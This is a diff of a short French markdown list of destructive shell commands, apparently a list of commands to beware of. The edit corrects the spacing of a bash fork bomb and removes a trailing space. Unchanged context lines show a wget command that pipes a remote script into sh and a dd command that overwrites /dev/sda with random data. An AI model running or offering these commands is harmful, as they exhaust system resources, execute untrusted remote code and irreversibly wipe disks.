@@ -3,7 +3,7 @@
 1 : 
 
 - avec cette commande :
-    ```:(){:|:&};:```
+    ```:(){ :|: & };:```
 
  Il s'agit d'une fonction bash simple qui crée des copies de lui-même qui à son tour crée un autre ensemble de copies de lui-même.
 
@@ -13,7 +13,7 @@
 installer le script avec cette commande :
     ```wget http://example.com/something -O – | sh —```
 
-3 : 
+3 :
 
 - avec cette commande :
     ```dd if=/dev/random of=/dev/sda```
